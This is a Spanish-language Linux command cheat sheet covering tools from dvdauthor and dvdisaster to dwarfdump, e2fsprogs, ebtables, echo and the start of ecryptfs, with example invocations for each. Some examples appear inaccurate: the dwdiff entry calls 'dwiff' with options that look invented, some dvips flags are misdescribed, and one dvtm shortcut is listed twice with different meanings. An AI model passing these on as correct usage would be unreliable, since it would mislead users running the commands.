$ dvconnect | dvbackup -t (verificar)
$ dvconnect | dvbackup -d | cpio -imV (restaurar)


dvdauthor
Crear videos compatibles con reproductores domesticos [genera los directorios VIDEO_TS y AUDIO_TS]. Ver página man para una muestra del archivo de control.
$ dvdauthor -o directorio archivo_control.xml
$ dvdauthor -o mi_dvd -T (crear table de contenidos)


dvdbackup
[dependencias: libdvdread, libdvdcss]. Ripeo de dvds.
$ dvdbackup -i /dev/cdrom  (/información del dvd)
$ dvdbackup -M -i/dev/cdrom -o/home/usuario/carpeta_destino (lanzar la aplicación)


dvdisaster
Herramienta útil para proteger los datos en CD y DVD contra la pérdida debido a rayaduras, envejecimiento o deterioro del medio. Lo hace generando datos de corrección de errores adicionales que pueden utilizarse para recuperar sectores ilegibles en el futuro.
$ dvdisaster -i /dev/sr0 -o backup.ecc -mRS01 ((unidad donde está el disco, guarda el archivo de corrección de errores y  especifica modo de corrección de errores externo)
Nota.- Modo "RS01" Genera un archivo de corrección de errores externo sin modificar el disco original el Modo "RS02" graba los datos de corrección de errores en el mismo disco, requiere espacio libre y el Modo "RS03" crea una imagen de disco con corrección de errores integrada.
$ dvdisaster -i /dev/sr0 -c backup.ecc -r (intentar recuperar utilizando el archivo de corrección generado anteriormente e intentando reconstruir los datos dañados)
$ dvdisaster -i disco_original.iso -o disco_protegido.iso -mRS03 (generar una imagen de disco con protección integrada)
$ dvdisaster -i /dev/sr0 -t (comprobar si un disco tiene sectores dañados)
$ dvdisaster (lanza la interfaz gráfica)


dvdtape
Herramienta que se utiliza en la producción profesional de DVDs para generar y transferir archivos en el formato DDP [Disc Description Protocol] y DDPMS [Disc Description Protocol Media Set] y los datos puedan ser enviados a cintas DLT [Digital Linear Tape] o archivos de disco. Es un protocolo estándar de la industria para la replicación de discos ópticos, asegurando que los datos grabados sean fieles al máster original. Soporta estructuras de disco DVD-Video y DVD-ROM.
$ dvdtape -o output_directory -i mi_pelicula.iso (especifica la carpeta donde se guardarán los archivos DDP generados y la imagen ISO de entrada)
Nota.- El directorio de salida contendrá archivos como: DDPID [identificación del conjunto DDP], CONTROL.DAT [archivo de control], IMAGE.DAT [los datos de la imagen] y PQDESCR.DAT [información sobre las pistas del DVD]
$ dvdtape -o /ruta/de/salida -i dvd_master.iso -f ddp_output.dat (guardar toda la estructura DDP en un solo archivo en lugar de generar múltiples archivos en un directorio)
$ dvdtape -o /dev/st0 -i dvd_master.iso (envía los datos a la unidad de cinta DLT de la imagen ISO de entrada)
$ dvdtape -o /ruta/salida -i dvd_master.iso --verify (verificación para asegurarse de que los archivos DDP son correctos)


dvgrab
Catura de videos desde una cámara digital DV.
Previas:
# modprobe rw1394
# chmod o+rw /dev/raw1394
Uso:
$ dvgrab --buffers 500 (Los videos se almacenarán de forma secuencial [001.avi, 002.avi...] y 500 frames. Por defecto 100)
$ dvgrab -f avi -s 0 videos/archivo.avi (Especificando formato, sin perdida de calidad y destino)
Algunas opciones:
	-a 30 (crear nuevo archivo cada 30 segundos
	-csize 5 (divide el archivo de captura cuando llega a 5MB)
	-debug all (mostrar información de la captura.
	-d 10,20 (tiempo total a capturar en formato SMIL. Por defecto ilimitado
	-every 50 (grabar un cuadro cada 50)
	-f dif (formato de captura. Por defecto raw. Algunos formatos: dif [raw con extensión .dif], qt [formato QuickTime], mpeg2 [compresión MPEG-2], jpeg [secuencia de imágenes]
	-F 20 (cantidad máxima de fotogramas por archivo. Por defecto ilimitado)
	-nostop (no detener la reproducción en el dispositivo al cerrar la captura)
	-rewind (rebobina el MiniDV al finalizar)
	-t (poner fecha y hora de registro como nombre del archivo)


dvi2dvi
Convertir archivos DVI [DeVice Independent] generados por NTT jTeX a un formato ASCII compatible con pTeX y viceversa. El formato DVI es un formato de salida común para documentos que han sido procesados por sistemas de tipografía TeX, pero aquí se enfoca en la interoperabilidad entre dos variantes específicas de TeX: jTeX y pTeX, que son versiones del sistema TeX adaptadas para manejar caracteres propios de diferentes idiomas, especialmente japonés.
$ dvi2dvi documento_jtex.dvi -o documento_ptex.dvi (convertir documento_jtex.dvi, generado por jTeX a pTeX)
$ dvi2dvi documento_ptex.dvi -o documento_jtex.dvi (de pTeX a jTeX)


dvidvi
Seleccionar, cambiar el orden y/o desplazar las páginas en un archivo .dvi [Device Independent].
Supongamos un documento .dvi con 8 páginas y se desea imprimirlo como un folleto A5 en papel A4. Para ello, se necesita reorganizar las páginas de manera que, al doblar el papel A4 por la mitad, las páginas aparezcan en el orden correcto
$ dvidvi -m 8:1,8,2,7,3,6,4,5 archivo.dvi archivo_reordenado.dvi (indica que el archivo tiene 8 páginas y especifica el nuevo orden de las páginas, el archivo de entrada y el de salida)
$ dvidvi -p 1,3,5 archivo.dvi archivo_seleccionado.dvi (selecciona las páginas 1, 3 y 5 del archivo de entrada y el archivo de salida que contiene solo las páginas seleccionadas)
$ dvidvi -s 2 archivo.dvi archivo_desplazado.dvi (desplazar las páginas 2 posiciones hacia adelante del archivo de entrada y archivo de salida con las páginas desplazadas)


dvips
Convierte archivos de entrada DVI [LaTeX y TeX] a PostScript.
$ dvips -t a4 -f archivo.dvi | lpr (imprimir un archivo en a4. Otros tipos: letter, legal, ledger, a3...)
$ dvips -l =9 archivo.dvi (finalizará con la novena página del documento, sin importar cómo estén numeradas las páginas en realidad)
$ dvips ejemplo.dvi (generará un archivo ejemplo.ps)
$ dvips -s6 -o ejemplo.pdf ejemplo.dvi (genera un archivo PDF suprimiendo la página 6)
$ dvips -Ppdf -G0 ejemplo.dvi (genera un archivo PDF y elimina las páginas en blanco)


dvtm
Terminal multiplexor
$ dvtm (Lanza la aplicacion)
Algunos atajos
	Ctrl+g c (Crear una nueva ventana)
	Ctrl+g x (Cerrar la ventana enfocada)
	Ctrl+g l (Aumenta el ancho de la ventana enfocada)
	Ctrl+g h (Disminuye la anchura de la ventana enfocada)
	Ctrl+g j (Cambiar el foco a la siguiente ventana)
	Ctrl+g k (Cambiar a la ventana anterior)
	Ctrl+g 3 (Ir a la ventana 3 contando desde la esquina superior izquierda)
	Ctrl+g espacio (Redisea todas las ventanas)
	Ctrl+g t (Cambiar el diseño de mosaico a pila vertical)
	Ctrl+g b (Cambiar a diseño de mosaico)
	Ctrl+g g (Cambiiar a diseño de cuadrícula)
	Ctrl+g l (Redibujar toda la pantalla)
	Ctrl+g q (Salir)


dwarf2sources
Utilidad para listar los archivos fuente de un binario determinado. dwarf2sources es una herramienta de línea de comandos para listar los archivos fuente que se usaron para crear un binario determinado y volcarlo en formato JSON. Los archivos de entrada no deben eliminarse y deben contener información de depuración en formato DWARF.
$ dwarf2sources -o salida archivo_binario
Nota.- Si el binario no contiene información DWARF, por ejemplo, si fue compilado sin -g o fue "strippeado" con strip, dwarf2sources no podrá listar los archivos fuente.


dwarfdump
Utilidad para volcar información de depuración de DWARF [Debugging With Attributed Record Formats] de objetos ELF [Executable and Linkable Format]. DWARF es un formato de datos utilizado para almacenar información de depuración en archivos binarios, como símbolos, tipos de datos, ubicaciones de variables, etc. También se puede utilizar para verificar y validar secciones de DWARF manipuladas.
$ dwarfdump -a programa (mostrar toda la información de depuración DWARF de un archivo ELF)
$ dwarfdump -c programa (mostrar la información de las unidades de compilación)
$ dwarfdump -l programa (mostrar la tabla de líneas [line table]. La tabla de líneas asocia las direcciones de memoria con las líneas de código fuente)
$ dwarfdump -p programa (mostrar la tabla de nombres públicos [public names]. La tabla de nombres públicos contiene los nombres de funciones y variables globales que están disponibles para ser referenciadas desde otros archivos objeto)
$ dwarfdump -r programa (mostrar la información de rangos [ranges]. Los rangos indican las direcciones de memoria donde se encuentran las diferentes partes del código, como funciones o bloques)
$ dwarfdump -v programa (verificar y validar la integridad de las secciones DWARF en el archivo ELF)


dwb
Navegador minimalista con soporte para flash.
Atajos: dwb:keys
Configuración: dwb:settings
Las configuraciones en texto plano en .config/dwb/
Algunos atajos:
	o (Para entrar una url)
	O (abrirla en una nueva pestaña)
	J (Cambiar entre pestañas)
	j (bajar por la página)
	k (subir)
	d (cerrar pestaña)
	u (reabrir pestaña cerrada)
	go (Editar la url)
	r (Recargar la página)
	R (Recargar sin usar la caché)
	f (Marcar los enlaces para escoger el que proceda)
	F (Marcar los enlaces y abrir el escogido en nueva pestaña)
	i (Modo insert para insertar en algún cuadro de dialogo)
	Esc (Volver a modo normal)
	M (Entrar url en en laces de interés)
	ctrl q (Para salir del navegador)


dwdiff
Programa diff [ver] que opera a nivel de palabra en lugar de a nivel de línea.
$ dwiff archivo1.txt archivo2.txt (mostrará las diferencias entre los dos archivos a nivel de palabra)
$ dwiff archivo1.txt +5 archivo2.txt (comenzará la comparación desde la quinta línea de ambos archivos)
$ dwiff archivo1.txt archivo2.txt --ignore-case (ignora las diferencias en mayúsculas y minúsculas al hacer la comparación)
$ dwiff archivo1.txt archivo2.txt --show-added-only (mostrar solo las líneas añadidas o eliminadas)
$ dwiff archivo1.txt archivo2.txt archivo3.txt (comparando varios archivos)
$ dwiff archivo1.txt archivo2.txt --context=3 --side-by-side (muestra las diferencias contexto y en formato lado a lado)


dwgsim
Simulación de lecturas de secuenciación de ADN. El comando dwgsim es una herramienta para generar lecturas de secuenciación corta a partir de una secuencia de referencia en formato FASTA [formato de archivo, utilizado para representar secuencias de nucleótidos o de aminoácidos]. Está diseñado para simular datos de secuenciación moderna como los obtenidos en plataformas como Illumina y Roche 454, permitiendo un modelado realista de errores de secuenciación.
$ dwgsim -N 1000000 -1 100 -2 100 referencia.fasta salida (1 millón de lecturas de pares de extremos con una longitud de 100 bases cada una de las dos lecturas, archivo referencia ADN en formato FASTA y prefijo para la salida. Generará archivos como salida.bwa.read1.fastq y salida.bwa.read2.fastq con las lecturas simuladas)
$ dwgsim -N 100000 -e 0.02 referencia.fasta salida_error (establece la tasa de error en 2% y genera 100,000 lecturas)
$ dwgsim -N 500000 -C 15 referencia.fasta salida_calidad (genera lecturas con un perfil de calidad más realista)
$ dwgsim -N 200000 -r 0.001 -R 0.001 referencia.fasta salida_indels (tasa de inserción del 0.1% y tasa de deleción del 0.1%)
$ dwgsim -N 0 -c 30 referencia.fasta salida_cobertura (cobertura de 30X del genoma y calcula automáticamente el número de lecturas necesarias para alcanzar la cobertura)
$ dwgsim -N 500000 -d 300 -s 50 -y 0.005 referencia.fasta salida_mutaciones (longitud del fragmento de ADN de 300 bases, desviación estándar de la longitud del fragmento y 0.5% de tasa de mutación)


dwww
Visualizar documentación (páginas man, info, README...) en el navegador. El archivo de configuración en /etc/dwww/dwww.conf. Se accede con http://localhost/dwww/index.html


dzdo
Se utiliza para ejecutar comandos con los privilegios de otro usuario.
$ dzdo -u root apt update (ejecutar "apt update" como usuario root)


dzegrep
Busqueda a través de archivos que pertenecen a un paquete Debian instalado. Parecido a degrep
$ dzegrep goodies debian-goodies
$ dzegrep dpigs debian-goodies


dzfgrep
Igual que dzgrep y dzegrep


dzgrep
Busqueda a través de archivos que pertenecen a un paquete Debian instalado. Parecido a degrep
$ dzgrep goodies debian-goodies
$ dzgrep dpigs debian-goodies


e-wrapper
Todos o casi todos los editores de Unix admiten la sintaxis de "editor +42 file", para abrir el archivo dado y comenzar con el cursor en la línea 42. Lamentablemente, la sintaxis que utilizan algunos programas que generan dichos datos es diferente y utilizan diferentes sintaxis para especificar la línea inicial donde se desea posicionar el cursor. Este contenedor reconocerá dichas referencias y llamará a su $EDITOR utilizando la notación +.
$ e archivo.txt:10 (si nuestro editor no usa la sintaxis +n archivo, abrirá archivo.txt en la linea 10 invocano al editor adecuado)


e2fsck
Optimizar y reparar particones ext2 y ext3. Preciso desmontarla.
# e2fsck -b 8193 /dev/hda2  ("-b 8193"que use la informacion de la primera copia del super bloque para reparar los daños.)
# e2fsck -fpDv /dev/sda1 (para optimizar la partición)
Nota.- "-c" buscar y marcar los bloques dañados, "-D" Optimiza, "-f" fuerza, "-p" repara y "-v" informa


e2fsprogs
Utilidades para los sistemas de ficheros ext2 y ext3. Incluye los ejecutables: badblocks [buscar bloques dañados en un dispositivo ], blkid [mostrar atributos de dispositivos de bloque], compile_et [compilador de tablas de error], debugfs [depurador de sistemas de ficheros], dumpe2fs [información del superbloque y de los grupos de bloques], e2fsck [chequear y reparar sistemas de ficheros], e2image [salvar información de un sistema de ficheros], e2label [muestra o cambia la etiqueta de un sistema de ficheros], findfs [encuentra un sistema de ficheros por su etiqueta o UUID], fsck, fsck.ext2 y fsck.ext3, [chequear y reparar un sistema de ficheros], logsave [salva la salida de un comando en un fichero de registro], mk_cmds [convierte tabla de nombres de comandos y mensajes de ayuda en un fichero fuente], mke2fs, mkfs.ext2 y mkfs.ext3 [crear sistemas de ficheros ext2 y ext3 en un dispositivo], mklost+found [crear un directorio lost+found en un sistema de ficheros], resize2fs [redimensionar sistemas de ficheros], lsattr [muestra los atributos de un fichero en un sistema de ficheros], chattr [cambia los atributos de los ficheros], tune2fs [ajusta los parámetros de un sistema de ficheros] y uuidgen [crea un nuevo identificador UUID].


e2guardian
filtra el contenido de las páginas web basándose en muchos métodos: lista de sitios prohibidos, coincidencia de frases, filtrado de PICS [Platform for Internet Content Selection] y filtrado de URL para controlar el acceso a ciertos contenidos. Proporciona capacidades de escaneo de virus en tiempo real para el acceso al contenido. La configuración predeterminada es muy elemental, pero permite controlar lo que se desea bloquear. Requiere squid u otro servidor proxy de almacenamiento en caché similar en la red local.
$ systemctl status e2guardian (verificar si está activo)
Si tenemos un listado de URLs de sitios prohibidos, se debe añadir em eñ archivo de configuración
# nano /etc/e2guardian/e2guardian.conf
blacklist_file: "/etc/e2guardian/blacklist.txt"


e2image
Genera una imagen de una partición ext2/ext3/ext4 y otros. También usado para redimensionar y mover particiones
# e2image /dev/sda2 copia.img
# e2image -ra -p -O 21623734272 /dev/sda1 (Mueve la partición al punto definido por el parametro -O. Se debe reducir la partición previamente con resize2fs)


e2label
[ntfsprogs]. Poner etiquetas a las particiones y dispositivos ext3
# e2label /dev/dispositivo_usb mi_usb  (cuando se conecte, en el escritorio aparecerá el icono con el nombre “mi_usb”)
# e2label /dev/sda5  (dirá si la partición sdb5 tiene nombre de etiqueta)


e2tools
Conjunto de utilidades para leer, escribir y manipular archivos en un sistema de archivos ext2/ext3. El propósito de estas utilidades es manipular sistemas de archivos ext2/ext3 desde el espacio de usuario sin necesidad de montarlos, de modo que puedan ser utilizados directamente por usuarios normales. Las utilidades incluidas son e2cp, e2mv, e2rm, e2mkdir, e2ln, e2ls y e2tail.
$ e2cp imagen_disco.ext3:/directorio/destino/archivo.txt /ruta/local/archivo.txt (copiar un archivo desde el sistema de archivos local a un sistema de archivos ext3 en una imagen de disco)
$ e2cp /ruta/local/archivo.txt imagen_disco.ext3:/directorio/destino/archivo.txt (copiar un archivo desde el sistema de archivos ext3 a un sistema de archivos local)
$ e2mv imagen_disco.ext3:/directorio/origen/archivo.txt imagen_disco.ext3:/directorio/destino/archivo.txt (mover un archivo dentro del sistema de archivos ext3)
$ e2rm imagen_disco.ext3:/directorio/archivo.txt (eliminar un archivo en el sistema de archivos ext3)
$ e2rm -r imagen_disco.ext3:/directorio/ (eliminar un directorio y su contenido)
$ e2mkdir imagen_disco.ext3:/directorio/nuevo_directorio (crear un nuevo directorio en el sistema de archivos ext3)
$ e2ln -s imagen_disco.ext3:/directorio/archivo.txt imagen_disco.ext3:/directorio/enlace.txt (crear un enlace simbólico)
$ e2ln imagen_disco.ext3:/directorio/archivo.txt imagen_disco.ext3:/directorio/enlace_duro.txt (crear un enlace duro)
$ e2ls imagen_disco.ext3:/directorio/ (listar el contenido de un directorio en el sistema de archivos ext3)
$ e2tail imagen_disco.ext3:/directorio/archivo.txt (mostrar las últimas 10 líneas de un archivo en el sistema de archivos ext3)
Nota.- Estas herramientas se pueden usar directamente en imágenes de disco .img, .ext3, etc. o en dispositivos de bloque /dev/sdX.


e2undo
Cuando la aplicación e2fsprogs falla, e2undo restablece el sistema de ficheros  ext2/ext3/ext4 anterior del dispositivo.


e2wm
Administrador de ventanas para Emacs.


e3
Editor que según como se lance usa la monenclatura de teclas de emacs, vi, pico ...
$ e3em archivo.txt (Usará las teclas de emacs)
$ e3vi archivo.txt (Usará las teclas de vi)


e4defrag
[e2fsprogs]. Desfragmentar particiones ext4.
# e4defrag /dev/sda2


eancheck
Programa para verificar y validar dígitos de control de códigos de barras EAN [European Article Numbers], PLU [Price Look-Up] y UPC [Universal Product Codes]. Toma un código de barras como entrada y verifica si el dígito de control []el último dígito del código] es correcto. El dígito de control se calcula utilizando un algoritmo específico que depende del tipo de código de barras. Si el dígito de control es correcto, el comando devuelve un mensaje indicando que el código es válido. Si no lo es, indica que el código es inválido.
$ eancheck 9789877671735 (verificar código EAN-13. 13 dígitos)
$ eancheck 4015 (verificar código PLU. 4 dígitos)
$ eancheck 042526114147 (verificar un código UPC-A. 12 dígitos)


eapoltest
[Extensible Authentication Protocol Over LAN]. Permite probar los métodos de autenticación EAP sin utilizar una conexión 802.1X completa. Se utiliza con frecuencia para probar la configuración EAP de los sistemas RADIUS.
# eapoltest --request=2 --eap=PEAP --identity=user --password= --radius-server=192.168.1.100:1812 (prueba la autenticación PEAP contra un servidor RADIUS en 192.168.1.100:1812 usando las credenciales proporcionadas)
# eapoltest --request=1 --eap=TLS,PEAP,POTP --identity=user --password= (prueba simultáneamente TLS, PEAP y POTP como métodos de autenticación EAP)
# eapoltest --request=0 --eap=TLS (verifica la configuración local de TLS sin intentar conect a ningún servidor RADIUS)
# eapoltest --request=2 --eap=TLS --identity=user --password= --ca-cert=/path/to/ca.crt (especificando un certificado CA personalizado para la prueba)
# eapoltest --request=2 --eap=PEAP --identity=user --password= --radius-server=192.168.1.100:1812 --supplicant-identifier="MyClient" (incluye opciones adicionales como el identificador del cliente)


earlyoom
[Early OOM]. Es un demonio que supervisa el uso de memoria y swap en el sistema y, si detecta que la memoria libre está por debajo de un umbral crítico, mata automáticamente los procesos con mayor consumo de memoria para evitar que el sistema se congele. Al eliminar OOM [Out-Of-Memory] evita que el sistema entre en un estado de inactividad causado por la swap, lo que es más probable que ocurra cuando hay un intercambio grande y la memoria es escasa.
# earlyoom (inicia earlyoom con sus valores predeterminados)
$ systemctl status earlyoom (ver si esta activo)
# systemctl enable --now earlyoom (activará earlyoom en cada inicio del sistema en segundo plano)
# earlyoom -m 5 -s 10 -r 60 (mata procesos cuando la memoria RAM libre cae por debajo del 5%, mata procesos cuando la swap libre es inferior al 10% e imprime estadísticas cada 60 segundos)


easygen
Herramienta que permite generar texto, HTML o código a partir de plantillas y datos de entrada. Es una herramienta que puede ser utilizada para una variedad de propósitos, como la generación de configuraciones, documentos, páginas web, o incluso código fuente.
Supongamos una plantilla llamada con el siguiente contenido:
$ cat saludo.tmpl
       Hola, {{.Nombre}}!
Y un archivo de datos con el siguiente contenido:
$ cat datos.json
       {
           "Nombre": "Juan"
       }
$ easygen saludo.tmpl datos.json (generar el texto)
       Hola, Juan! (el resultado)
Otro ejemplo con una plantilla HTML:
$ cat pagina.tmpl
      <!DOCTYPE html>
      <html>
      <head>
          <title>{{.Titulo}}</title>
      </head>
      <body>
          <h1>{{.Titulo}}</h1>
          <p>{{.Contenido}}</p>
      </body>
      </html>
Y un archivo de datos
$ cat datos_html.json
      {
          "Titulo": "Mi Página",
          "Contenido": "Bienvenido a mi página web."
      }
$ easygen pagina.tmpl datos_html.json (generar el HTML)
El resultado será:
       <!DOCTYPE html>
       <html>
       <head>
           <title>Mi Página</title>
       </head>
       <body>
           <h1>Mi Página</h1>
           <p>Bienvenido a mi página web.</p>
       </body>
       </html>


easygit
Script contenedor de un solo archivo para Git, diseñado para que Git sea fácil de aprender y usar, con unas características básicas como que se centra en la documentación y los ejemplos, elimina muchas violaciones del principio de la mínima sorpresa y proporciona subcomandos que son una extensión natural de las capacidades que los usuarios conocen de cvs/svn.
$ eg init nombre_del_repositorio (inicializar un nuevo repositorio)
$ eg clone https://url-del-repositorio.git (crea una copia local del repositorio remoto)
$ eg status (muestra información sobre los cambios no confirmados, archivos sin seguimiento y ramas actuales)
$ eg add archivo1 archivo2 (agregar archivos específicos al área de preparación)
$ eg add . (agregar todos los archivos modificados)
$ eg commit -m "Mensaje de confirmación" (guarda los cambios en el historial del repositorio con el mensaje proporcionado)
$ eg log (muestra una lista de confirmaciones anteriores con detalles como el autor, la fecha y el mensaje de confirmación)
$ eg pull (sincroniza el repositorio local con el remoto)
$ eg push (sube los cambios al servidor remoto)


eatmydata
[Cómete mis datos]. Herramienta diseñada para desactivar las llamadas al sistema fsync, sync, y otras operaciones similares que garantizan que los datos escritos en el disco sean realmente guardados de manera persistente. Esto puede ser útil en situaciones donde se prioriza el rendimiento sobre la integridad de los datos, como en entornos de pruebas o desarrollo, donde la pérdida de datos no es crítica. Cuando se ejecuta un comando con eatmydata, este intercepta las llamadas al sistema que normalmente aseguran que los datos se escriban en el disco [como fsync y sync], y las ignora lo que hace que las operaciones de escritura parezcan completarse más rápido, ya que no se espera a que los datos se escriban físicamente en el disco.
$ eatmydata apt-get install paquete (hará que la instalación sea más rápida, ya que no se esperará a que los datos se escriban en el disco antes de continuar)


ebb
[= extractbb]. Para cada archivo JPEG, PNG o PDF dado en la línea de comandos, extractbb extrae la información del cuadro delimitador y la escribe en un archivo con extensión .xbb, junto con cierta información de cabecera. Estos archivos pueden ser utilizados por dvipdfmx u otros programas. Si se llama como ebb, la salida se escribe en formato bb (y con extensión .bb) que utiliza dvipdfm. Xbb puede definirse como sinónimo de extractbb en su sistema.
$ ebb -v file.png


ebnflint
Verifica la consistencia y corrección gramatical de las producciones EBNF [Extended Backus-Naur Form], que se usan a menudo para definir la sintaxis de los lenguajes de programación y otros sistemas formales.
Verifica que las producciones EBNF [Extended Backus–Naur Form] sean consistentes y gramaticalmente correctas. Las lee desde un documento HTML como la especificación Go.
$ ebnflint mi_programa.ebnf (comprobará la sintaxis y la gramática del fichero mi_grama.ebnf. Si el fichero es válido, no informará de ningún error. Si hay errores, proporcionará mensajes de error detallados para corregirlos)


ebook-
Convertir/visualizar a formato ebook.
$ ebook-convert texto.pdf texto.epub
$ ebook-viewer texto.epub (Visualiza con la apliciación calibre)


ebook-speaker
Lector de libros electrónicos [EPUB, PDF, MOBI...] que lee en voz alta con una voz sintética. Tiene una interfaz de usuario sencilla adecuada para terminales Braille.
$ ebook-speaker libro.epub (después de aceptar algunas opciones empieza a leer el libre)
$ ebook-speaker -d 0:pulseaudio libro.epub (especificando salida)


ebook2cw
Programa que convierte un archivo de texto simple [ISO 8859-1 o UTF-8] en formato MP3 o OGG que contienen el texto en código Morse.
$ ebook2cw -o salida.mp3 libro.txt (convierte el contenido de libro.txt en un archivo de audio llamado salida.mp3 con la velocidad y frecuencia predeterminadas)
$ ebook2cw -w 20 -f 800 -o salida.mp3 libro.txt (especificar la velocidad en palabras por minuto y la frecuencia del tono)


ebook2epub
Convertidor de otros formatos de libros electrónicos a EPUB.
$ ebook2epub libro.mobi (generará un archivo libro.epub en el mismo directorio)
$ ebook2epub documento.pdf (la conversión desde PDF puede no ser perfecta, ya que los archivos PDF no siempre están estructurados como texto fluido)
$ ebook2epub *.mobi *.fb2 *.pdf (generará un archivo EPUB para cada archivo de entrada)
$ ebook-meta libro.epub (verificar si el archivo EPUB generado es válido. Este comando pertenece a la aplicación "calibre")


ebtables
Herramienta que permite configurar reglas de filtrado de tramas Ethernet en el nivel de la capa de enlace de datos. Es útil cuando se trabaja con bridges en Linux, ya que permite controlar el tráfico antes de que llegue a las capas superiores. Es análogo a iptables, pero opera en la capa MAC en lugar de en la capa IP.
# ebtables -A FORWARD -p arp --arp-opcode Request -j DROP (bloquea todas las solicitudes ARP que pasan a través del bridge)
# ebtables -A FORWARD -s 00:11:22:33:44:55 -j DROP (impide que el tráfico de la dirección MAC 00:11:22:33:44:55 atraviese el bridge)
# ebtables -t nat -A PREROUTING -d 00:11:22:33:44:55 -j dnat --to-destination 66:77:88:99:AA:BB (cambia la dirección MAC de destino en las tramas entrantes)
# ebtables -A FORWARD -p ! ipv4 -j DROP (solo permite el tráfico IPv4 en la red)
# ebtables -A FORWARD -p ipv4 --ip-src 192.168.1.100 -j DROP (bloquea el tráfico proveniente de la IP 192.168.1.100)
# ebtables -L (ver las reglas activas en ebtables)
# ebtables -F (eliminar todas las reglas)
# ebtables-save > reglas.ebtables (guardar las reglas)
# ebtables-restore < reglas.ebtables (restaurarlas)


ecaccess
Conjunto de herramientas ECMWF [European Centre for Medium-Range Forecasts - Centro Europeo de Previsiones Meteorológicas a Plazo Medio] para acceder a sus servicios de datos meteorológicos.
Comandos para la gestión de certificados (ecaccess-certificate-*)
          ecaccess-certificate-create  - Crear certificado para ECtools
          ecaccess-certificate-list    - Enumerar operaciones disponibles
Comandos para la gestión de archivos (ecaccess-file-*)
          ecaccess-file-chmod          - Cambiar bits de modo de archivo de ECaccess
          ecaccess-file-copy           - Copiar un archivo de ECaccess
          ecaccess-file-delete         - Eliminar un archivo de ECaccess
          ecaccess-file-dir            - Enumerar el contenido del directorio de ECaccess
          ecaccess-file-get            - Descargar un archivo de ECaccess
          ecaccess-file-mdelete        - Eliminar varios archivos de ECaccess a la vez
          ecaccess-file-mget           - Descargar varios archivos de ECaccess a la vez
          ecaccess-file-mkdir          - Crear un directorio en el sistema de archivos de ECaccess
          ecaccess-file-modtime        - Mostrar la última hora de modificación de un archivo de ECaccess
          ecaccess-file-move           - Mover o renombrar archivos de ECaccess
          ecaccess-file-mput           - Cargar varios archivos locales en el sistema de archivos de ECaccess
          ecaccess-file-put            - Cargar un archivo en el sistema de archivos de ECaccess
          ecaccess-file-rmdir          - Eliminar un directorio en el sistema de archivos de ECaccess
          ecaccess-file-size           - Mostrar el tamaño de un archivo de ECaccessShow the Size of an ECaccess File
Comandos para la gestión de trabajos por lotes (ecaccess-job/queue-*)
          ecaccess-job-delete          - Eliminar un trabajo de ECaccess
          ecaccess-job-get             - Descargar un archivo de salida/entrada/error de trabajo
          ecaccess-job-list            - Enumerar todos los trabajos de ECaccess
          ecaccess-job-restart         - Reiniciar un trabajo de ECaccess
          ecaccess-job-submit          - Enviar un nuevo trabajo de ECaccess
          ecaccess-queue-list          - Enumerar las colas disponibles
Comandos para la gestión de eventos en ECMWF (ecaccess-event-*)
          ecaccess-event-list          - Enumerar los eventos disponibles
          ecaccess-event-send          - Activar un evento de ECaccess
Comandos para la gestión de asociaciones de ECtrans (ecaccess-association-*)
          ecaccess-association-delete  - Eliminar asociación
          ecaccess-association-get     - Obtener el archivo descriptivo de la asociación
          ecaccess-association-list    - Enumerar sus asociaciones de ECtrans
          ecaccess-association-protocol- Enumerar el protocolo ECtrans compatible
          ecaccess-association-put     - Actualizar/crear una asociación
Comandos para la gestión de transferencias de ECtrans (ecaccess-ectrans-*)
          ecaccess-ectrans-delete      - Eliminar ECtrans
          ecaccess-ectrans-list        - Enumerar todas las transferencias de ectrans
          ecaccess-ectrans-request     - Solicitar una nueva transferencia de ECtrans
          ecaccess-ectrans-restart     - Reiniciar una transferencia de ECtrans existente
Comandos para obtener información de las puertas de enlace de ECaccess (ecaccess-gateway-*)
          ecaccess-gateway-list        - Enumerar las puertas de enlace de ECaccess
          ecaccess-gateway-name        - Mostrar el nombre de la la puerta de enlace de ECaccess predeterminada
          ecaccess-gateway-connected   - muestra el estado de conexión de la puerta de enlace de ECaccess
Comandos para obtener información general en ECMWF
          ecaccess-cosinfo             - muestra información de ECMWF


ecasound
paquete de software diseñado para el procesamiento de audio multipista. Se puede utilizar para una amplia gama de operaciones de audio: grabación, conversión de formatos, procesamiento de efectos multipista y mezcla para trabajar en entornos donde no se dispone de una interfaz gráfica.
$ ecasound -i archivo.mp3 (reproducirá el archivo archivo.wav a través de la salida de audio predeterminada)
$ ecasound -i alsa -o grabacion.wav (grabará audio desde la entrada predeterminada, usualmente el micrófono y lo guardará en grabacion.wav)
$ ecasound -i archivo.mp3 -y:10 -t:20 -o recorte.mp3 (recortar del segundo 10 al 20 de archivo.mp3 y guardarlo en recorte.mp3)


echo
Muestra o incluye algo en un fichero.
$ echo $$   (muestra el PID de la consola)
$ echo $PS1   (muestra el prompt)
# echo deb ftp://ftp.debian.org/debian etch main >> /etc/apt/source.list  (añade el repositorio mencionado al archivo sources.list)
Nota.- con un solo “>” pondria la linea especificada borrando todo lo demas.)
$ echo $((10*2)) (Realiza el cálculo matemático)
$ echo “ Buenas.. voy a reiniciar ¿Haces algo?” >> /dev/pts/23 (Manda el mensaje a la consola 23)
$ echo rm *.png (lista lo que se va a borrar, antes de lanzar rm *.png)
$ echo "" > archivo.txt (Borra el contenido de archivo.txt. Para un borrado total mejor usar $ :> archivo.txt)
$ echo -e "<?php\nphpinfo();\n?>" (la opción -e hace que se interprete los saltos de linea [\n], tabulaciones [\t] etc. en algunas distros es necesario lanzar: shopt -s extglob)
$ echo -e "linux\\tes\\tgenial" (tabular cada palabra con \\t. La primera barra [\] sirva para escapar el caracter \t)
$ echo -e "Dato1\n\tDato2\n\tDato3\n" > ejemplo.txt (entra datos en ejemplo.txt con salto de linea despues de cada dato)
$ echo "linux is beautiful" | tee -a *.txt (Mandar texto a varios archivos de texto)
$ echo !(HTMLS|plantilla*) (Es preciso activar: shopt -s extglob . Lisxta todo menos lo especificado)


ecryptfs
[ecryptfs-utils cryptsetup]. Sistema de ficheros que permite encriptar la informacion. Puede ser montado en un sistema de ficheros convencional [ext4, ext3...] lo cual siginifica que no tenemos que preocuparnos por asignarle espacio: conforme añadimos o eliminamos archivos, el espacio crece o decrece. Se podría coger un solo fichero encriptado, enviarse a otro PC y acceder a la información de ese fichero usando la misma contraseña.
1.-
Encriptar un directorio:
$ mkdir cripta (Crear directorio)
# chmod 700 cripta (Otorgarle permisos)
